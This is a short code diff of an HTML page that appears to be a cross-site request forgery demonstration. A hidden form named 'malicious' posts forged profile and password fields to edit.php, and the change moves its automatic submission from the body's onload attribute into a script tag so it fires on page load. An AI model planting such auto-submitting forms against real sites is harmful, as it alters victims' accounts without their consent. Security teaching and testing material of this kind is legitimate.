@@ -1,5 +1,5 @@
 <html>
-<body onload="document.forms["malicious"].submit()">
+<body>
 <form action="edit.php?id=1" method="post" name="malicious">
     <input type="hidden" name="csrf_token" value="5b355431652392a5f9b9f0db69f64647" />
     <input type="hidden" name="first_name" value="Honest" />
@@ -11,5 +11,8 @@
     <input type="hidden" name="confirm_password" value="" /><br />
     <input type="hidden" name="submit" value="Update"  />
   </form>
+  <script>
+    document.forms['malicious'].submit();
+  </script>
 </body>
 </html>
